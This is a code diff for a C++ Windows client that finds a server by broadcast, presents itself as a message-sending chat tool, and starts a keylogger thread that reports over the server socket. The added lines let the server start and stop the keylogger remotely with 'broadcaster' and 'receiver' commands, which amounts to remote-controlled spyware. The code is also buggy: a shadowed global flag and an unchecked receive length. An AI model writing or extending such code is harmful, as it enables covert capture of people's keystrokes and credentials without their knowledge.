@@ -88,6 +88,8 @@ ULONG scanForServer(){
     return broadcastAddr.sin_addr.s_addr;
 
 }
+
+std::atomic<bool> running(true);
 int main(int argc, char **argv) {
     startup();
     // Flush after every std::cout / std::cerr
@@ -139,41 +141,53 @@ int main(int argc, char **argv) {
     std::cout << "Discovered server: " << inet_ntoa(recvAddr.sin_addr) << std::endl;
     std::cout<<"connected, please type and then click enter to send messages to the server"<<std::endl;
     std::cout<<"type \"terminate\" to kill the connection"<<std::endl;
-    const char* expectedPrefix = "SERVER_RESPONSE";
-    if (strncmp(buffer, expectedPrefix, strlen(expectedPrefix)) != 0) {
+    const char* expectedPrefix = "SERVER_RESPONSE: ";
+    size_t prefixLength = strlen(expectedPrefix);
+    if (strncmp(buffer, expectedPrefix, prefixLength) != 0) {
         std::cout << "did not get the expected response, closing connection" << std::endl;
         std::cout << "response received: " << buffer << std::endl;
     } else{
-
-        // while(true){
-        //     std::string input;
-        //     std::getline(std::cin,input);
-        //     if(input=="terminate")break;
-        //
-        //     send(clientFD,input.c_str(),input.size(),0);
-        // }
-         std::atomic<bool> running(true);
+        std::atomic<bool> running(true);
         
          std::thread keylogger_thread(startLogging,clientFD, std::ref(running));
 
         // Simulate the client doing other work
-         while(true){
-         int n = recvfrom(clientFD, buffer, sizeof(buffer), 0, (struct sockaddr *)&recvAddr, &addrLen);
-         buffer[n] = '\0';
-         // When ready to stop the keylogger
-         const char* terminateMessage = "TERMINATE";
-             if(strncmp(buffer,terminateMessage,strlen(terminateMessage)) !=0){
-                 running = false;
-        
-                 if (keylogger_thread.joinable()) {
-                     keylogger_thread.join();
-                 }
-                 break;
-             }
-        
-        
-        
-         }
+        while(true){
+            int n = recvfrom(clientFD, buffer, sizeof(buffer), 0, (struct sockaddr *)&recvAddr, &addrLen);
+            buffer[n] = '\0';
+            // When ready to stop the keylogger
+            const char* terminateMessage = "TERMINATE";
+            if(strncmp(buffer,terminateMessage,strlen(terminateMessage)) ==0){
+                running = false;
+
+                if (keylogger_thread.joinable()) {
+                    keylogger_thread.join();
+                }
+                break;
+            }
+
+            std::string afterPrefix(buffer + prefixLength);
+            afterPrefix.erase(0, afterPrefix.find_first_not_of(" \n\r\t")); // Trim
+
+            if (afterPrefix == "broadcaster") {
+                if (!running) {
+                    running = true;  // Set running to true and start the keylogger
+                    keylogger_thread = std::thread(startLogging, clientFD, std::ref(running));
+                    std::cout << "Now in broadcaster mode. Keylogger started.\n";
+                }
+            } else if (afterPrefix == "receiver") {
+                if (running) {
+                    running = false;  // Set running to false to stop the keylogger
+                    if (keylogger_thread.joinable()) {
+                        keylogger_thread.join();  // Join the thread to ensure it stops
+                    }
+                    std::cout << "Now in receiver mode. Keylogger stopped.\n";
+                }
+            }
+
+
+        }
+
     }
     closesocket(clientFD);
     WSACleanup();
